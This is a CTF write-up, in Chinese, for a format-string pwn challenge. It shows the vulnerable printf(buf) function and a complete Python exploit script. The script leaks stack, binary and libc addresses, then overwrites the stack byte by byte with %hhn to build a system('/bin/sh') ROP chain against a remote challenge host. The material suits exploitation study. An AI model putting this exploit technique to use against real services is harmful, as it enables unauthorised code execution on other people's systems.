
## fmtstr

正如题目名称，这是一道格式化字符串的 pwn 题，漏洞函数如下：

```c
void __fastcall passwd()
{
  while ( 1 )
  {
    read(0, buf, 0x30uLL);
    MEMORY[0x40B0] = 0;
    if ( !strncmp(buf, "fakepwn", 7uLL) )
      break;
    printf("Your password ");
    printf(buf);
    puts(" is wrong, plz try again");
  }
  puts("password check ok");
}
```

而且题目还很贴心地提供了循环，前面的 name 也没有什么利用价值，直接按照 buffer 不在栈上的 fmtstr 题目模板来打就行，exp.py 如下：

```py
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME] \033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

ru(b'Welcome to my pwn home, Please let me know your name first.\n')
name = b"testNAME"
s(name)

#  ru(b" is wrong, plz try again")
payload = b"%p."*10
s(payload)
ru(b"Your password ")
stack_base1 = int(ru(b".", drop=True), 16) + 0x2120
ru(b".")
ru(b".")
ru(b".")
ru(b".")
stack_base = int(ru(b".", drop=True), 16) - 0x10
elf_base = int(ru(b".", drop=True), 16) - 0x1390
ru(b".")
libc_base = int(ru(b".", drop=True), 16) - 0x28565
lg("stack_base1")
lg("stack_base")
lg("elf_base")
lg("libc_base")
pop_rdi_ret = elf_base + 0x0000000000001403
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
system_addr = libc_base + libc.symbols['system']
ret_addr = pop_rdi_ret + 1

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base+0xa8)&0xffff).encode() + b"c%26$hn"
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8)&0xff).encode() + b"c%39$hhn"
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 0xa8 + 1)&0xff).encode() + b"c%26$hhn"
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((stack_base + 8) >> 8)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((pop_rdi_ret))&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 0xa8)&0xff).encode() + b"c%26$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 1)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((pop_rdi_ret >> 8))&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((bin_sh_addr))&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 1)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((bin_sh_addr) >> 8)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 2)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((bin_sh_addr) >> 16)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 3)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((bin_sh_addr) >> 24)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 4)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((bin_sh_addr) >> 32)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 5)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((bin_sh_addr) >> 40)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 0)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((ret_addr) >> 0)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 1)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((ret_addr) >> 8)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 2)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((ret_addr) >> 16)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 3)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((ret_addr) >> 24)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 4)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((ret_addr) >> 32)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 5)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((ret_addr) >> 40)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 0 + 8)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((system_addr) >> 0)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 1 + 8)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((system_addr) >> 8)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 2 + 8)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((system_addr) >> 16)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 3 + 8)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((system_addr) >> 24)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 4 + 8)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((system_addr) >> 32)&0xff).encode() + b"c%27$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str((stack_base + 8 + 8 + 8 + 5 +8)&0xff).encode() + b"c%39$hhn"
#  debugB()
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
payload = b"%" + str(((system_addr) >> 40)&0xff).encode() + b"c%27$hhn"
s(payload)
ru(b"Your password ")

ru(b" is wrong, plz try again")
sl("fakepwn")

ia()
```

运行 `./exp.py remote 172.31.0.37:8888` 即可 getshell 获得 flag .

